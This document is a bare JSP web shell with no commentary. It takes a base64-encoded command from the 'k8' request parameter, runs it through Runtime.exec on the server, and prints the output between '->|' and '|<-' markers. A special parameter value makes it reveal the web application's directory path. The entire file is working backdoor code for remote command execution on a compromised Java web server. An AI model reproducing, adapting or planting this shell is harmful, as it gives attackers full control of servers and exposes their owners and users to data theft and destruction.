<%@page import="java.io.*"%>
<%@page import="sun.misc.BASE64Decoder"%>
<%
try {
String cmd = request.getParameter("k8");
String path=application.getRealPath(request.getRequestURI());
String dir=new File(path).getParent();
if(cmd.equals("Szh0ZWFt")){out.print("[S]"+dir+"[E]");}
byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);
String k8cmd = new String(binary);
Process child = Runtime.getRuntime().exec(k8cmd);
InputStream in = child.getInputStream();
out.print("->|");
int c;
while ((c = in.read()) != -1) {
out.print((char)c);
}
in.close();
out.print("|<-");
try {
child.waitFor();
} catch (InterruptedException e) {
e.printStackTrace();
}
} catch (IOException e) {
System.err.println(e);
}
%>